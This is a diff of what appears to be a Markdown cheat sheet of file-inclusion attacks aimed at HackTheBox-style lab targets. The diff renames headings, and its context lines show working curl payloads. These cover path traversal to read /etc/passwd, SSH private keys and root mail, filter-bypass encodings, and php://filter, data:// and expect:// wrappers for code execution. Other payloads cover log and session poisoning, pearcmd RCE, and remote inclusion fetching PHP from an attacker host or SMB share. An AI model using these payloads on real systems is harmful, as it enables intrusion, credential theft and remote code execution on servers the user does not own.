@@ -6,7 +6,7 @@
 
 ---
 
-## LFI - Basic Traversal
+## lfi traversal read passwd
 Climb out of webroot to read /etc/passwd.
 
 ```bash
@@ -17,7 +17,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../etc/passwd"
 
 ---
 
-## LFI - Many Levels (brute depth)
+## brute lfi traversal depth
 When depth is unknown, hammer common depths.
 
 ```bash
@@ -28,7 +28,7 @@ for i in 1 2 3 4 5 6 7 8 9 10; do dots=$(printf '../%.0s' $(seq 1 $i)); curl -s 
 
 ---
 
-## LFI - Null Byte Truncation (legacy PHP)
+## bypass lfi null byte legacy php
 Strip enforced extension on PHP <5.3.4.
 
 ```bash
@@ -39,7 +39,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../etc/passwd%00"
 
 ---
 
-## LFI - Double Encoding
+## bypass lfi double encoding
 Bypass naive ../ filters.
 
 ```bash
@@ -50,7 +50,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}%252e%252e%252f%252e%252e%2
 
 ---
 
-## LFI - Encoded Slash (Apache mis-route)
+## bypass lfi encoded slash apache
 Use %2e/%2f to bypass path normalization.
 
 ```bash
@@ -61,7 +61,7 @@ curl -s "{{URL:url:http://target.htb/}}assets/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/pass
 
 ---
 
-## LFI - Bypass Strip-Once (....//)
+## bypass lfi strip once nested
 Filters that remove ../ once: use nested form.
 
 ```bash
@@ -72,7 +72,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}....//....//....//etc/passw
 
 ---
 
-## LFI - Read PHP Source (php://filter)
+## lfi read php source filter
 Base64-encode PHP source to defeat interpreter.
 
 ```bash
@@ -83,7 +83,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}php://filter/convert.base64
 
 ---
 
-## LFI - php://filter Chain (UTF Trick)
+## bypass lfi filter chain utf
 Bypass when base64 string is detected.
 
 ```bash
@@ -94,7 +94,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}php://filter/convert.iconv.
 
 ---
 
-## LFI - data:// Wrapper RCE
+## lfi rce data wrapper
 Inline PHP via data: URI.
 
 ```bash
@@ -105,7 +105,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}data://text/plain,<?php sys
 
 ---
 
-## LFI - data:// Base64 RCE
+## lfi rce data base64
 Same but base64-encoded payload.
 
 ```bash
@@ -117,7 +117,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}data://text/plain;base64,PD
 
 ---
 
-## LFI - expect:// RCE
+## lfi rce expect wrapper
 Run command directly via expect wrapper.
 
 ```bash
@@ -128,7 +128,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}expect://{{CMD:str:id}}"
 
 ---
 
-## LFI - phar:// Deserialization
+## lfi phar deserialization
 Trigger PHP deserialization via phar archive (with metadata gadget).
 
 ```bash
@@ -139,7 +139,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}phar://{{UPLOADED_PHAR:str:
 
 ---
 
-## LFI - /proc/self/environ Poisoning
+## lfi rce proc self environ
 Poison User-Agent then include environ.
 
 ```bash
@@ -151,7 +151,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../proc/self/envir
 
 ---
 
-## LFI - Apache Log Poisoning
+## lfi rce apache log poison
 Inject PHP via User-Agent in access.log.
 
 ```bash
@@ -163,7 +163,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/log/apache2
 
 ---
 
-## LFI - SSH Log Poisoning
+## lfi rce ssh log poison
 SSH login attempt with PHP code as username.
 
 ```bash
@@ -175,7 +175,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/log/auth.lo
 
 ---
 
-## LFI - Read Mail (root)
+## lfi read root mail
 Cron mail / mbox file read.
 
 ```bash
@@ -186,7 +186,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/spool/mail/
 
 ---
 
-## LFI - SSH Private Key
+## lfi read ssh private key
 Read user SSH key for lateral SSH.
 
 ```bash
@@ -197,7 +197,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../home/{{USERNAME
 
 ---
 
-## LFI - PHP Session Inclusion
+## lfi rce php session
 Include attacker-controlled session file.
 
 ```bash
@@ -210,7 +210,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../var/lib/php/ses
 
 ---
 
-## LFI - Windows Common Targets
+## lfi read windows files
 Read Windows files via traversal.
 
 ```bash
@@ -221,7 +221,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../../../../Windows/System3
 
 ---
 
-## LFI - Mixed Slash Windows
+## bypass lfi windows mixed slash
 Windows accepts mixed forward/back slashes.
 
 ```bash
@@ -232,7 +232,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}../..\\../..\\Windows/syste
 
 ---
 
-## LFI - hMailServer Config (HTB Mailing pattern)
+## lfi read hmailserver config
 Common Windows mail server target.
 
 ```bash
@@ -243,7 +243,7 @@ curl -s "{{URL:url:http://target.htb/download.php?file=}}../../../../../../../..
 
 ---
 
-## LFI - PEAR pearcmd RCE (CVE-2007-pearcmd)
+## lfi rce pearcmd
 Classic PEAR/pearcmd LFI to RCE pattern.
 
 ```bash
@@ -255,7 +255,7 @@ curl -s "{{URL:url:http://target.htb/}}d.php?0={{CMD:str:id}}"
 
 ---
 
-## RFI - Remote Include
+## rfi rce remote include
 Pull PHP from attacker host (allow_url_include=1 needed).
 
 ```bash
@@ -266,7 +266,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}http://{{LHOST:ip}}:{{LPORT
 
 ---
 
-## RFI - SMB Share Inclusion (Windows)
+## rfi rce smb share windows
 Include via SMB UNC path.
 
 ```bash
@@ -277,7 +277,7 @@ curl -s "{{URL:url:http://target.htb/page.php?file=}}\\\\{{LHOST:ip}}\\share\\sh
 
 ---
 
-## LFI - Sensitive File Wordlist Targets
+## fuzz lfi sensitive files wordlist
 Common files to try via fuzzer.
 
 ```bash
